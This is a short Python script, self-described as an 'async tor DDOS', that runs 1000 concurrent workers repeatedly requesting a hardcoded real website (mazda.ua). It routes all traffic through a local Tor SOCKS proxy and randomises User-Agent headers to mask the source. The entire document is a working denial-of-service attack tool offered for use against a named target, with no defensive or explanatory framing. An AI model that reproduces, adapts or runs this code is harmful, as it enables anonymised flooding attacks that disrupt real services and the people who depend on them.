#!/usr/bin/python3 -B

'''
python async tor DDOS
2022.02.28
'''

import random
import asyncio
import aiohttp
from aiohttp_socks import ProxyConnector


class TAttack():
    def __init__(self, aUrl: str):
        self.Url = aUrl
        self.CntAll = 0
        self.CntErr = 0

    def _GetHeaders(self) -> dict:
        OSs = ['Macintosh; Intel Mac OS X 10_15_5', 'Windows NT 10.0; Win64; x64; rv:77', 'Linux; Intel Ubuntu 20.04']
        Browsers = ['Chrome/83', 'Firefox/77', 'Opera/45']

        return {
            'Accept': '*/*',
            'User-Agent': 'Mozilla/5.0 (%s) %s' % (random.choice(OSs), random.choice(Browsers))
        }

    def _GetConnector(self, aProxy: bool) -> ProxyConnector:
        Proxies = ['socks5://localhost:9050']
        if (aProxy):
            return ProxyConnector.from_url(random.choice(Proxies))

    async def _Get(self, aSession, aTaskId: int, aUrl: str):
        try:
            async with aSession.get(aUrl, headers=self._GetHeaders()) as Response:
                Data = await Response.read()
                print('Count:%4d, TaskId:%3d, Status:%d, Size:%dK' % (self.CntAll, aTaskId, Response.status, len(Data)/1000))
                return Data
        except Exception as E:
            self.CntErr += 1
            print('Error', self.CntErr, aUrl, E)

    async def _Worker(self, aSession, aTaskId: int):
        await asyncio.sleep(aTaskId)

        self.IsRun = True
        while (self.IsRun):
            await asyncio.sleep(1)
            self.CntAll += 1
            await self._Get(aSession, aTaskId, self.Url)

    async def Run(self, aMaxTasks: int):
        async with aiohttp.ClientSession(connector=self._GetConnector(True)) as Session:
            #Resolver = 'https://ipinfo.io/json'
            Resolver = 'http://icanhazip.com'
            Data = await self._Get(Session, -1, Resolver)
            print('Ext-IP', Data.decode())

            Tasks = [asyncio.create_task(self._Worker(Session, i)) for i in range(aMaxTasks)]
            await asyncio.gather(*Tasks)


Url = 'https://mazda.ua'
MaxTasks = 1000
Attack = TAttack(Url)
asyncio.run(Attack.Run(MaxTasks))
